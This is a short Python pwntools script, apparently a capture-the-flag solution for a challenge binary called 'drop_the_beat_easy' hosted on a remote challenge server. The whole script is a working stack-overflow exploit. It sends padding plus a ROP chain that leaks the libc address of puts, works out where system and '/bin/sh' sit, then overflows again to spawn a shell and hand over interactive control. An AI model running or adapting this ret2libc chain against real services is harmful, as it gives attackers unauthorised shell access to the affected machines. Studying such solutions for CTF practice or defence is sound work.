from pwn import *

libc = ELF('libc.so.6')
e = ELF('drop_the_beat_easy')

# p = process('drop_the_beat_easy')
p = remote('prob.vulnerable.kr', 20002)

print p.recvuntil('2) No Beat For You..!\n')

p.sendline('1')
print p.recvuntil('Give Me a Beat!!\n')

p.sendline('A' * 100 + 'A' * 4 + p32(e.symbols['puts']) + p32(e.symbols['main']) + p32(e.got['puts'])) # + p32(e.symbols['main'])) #p32(e.symbols['puts']) + 'A' * 4 + p32(e.got['puts']) + )
print p.recvuntil('AWESOME!\n')

puts = u32(p.recv(4))
print hex(puts)

libc_base = puts - libc.symbols['puts']
print 'libc_base: ' + hex(libc_base)
system = libc_base + libc.symbols['system']
sh = libc_base + libc.search("/bin/sh").next()

print p.recvuntil('2) No Beat For You..!\n')

p.sendline('1')
print p.recvuntil('Give Me a Beat!!\n')

p.sendline('A' * 100 + 'A' * 4 + p32(system) + 'A' * 4 + p32(sh))

p.interactive()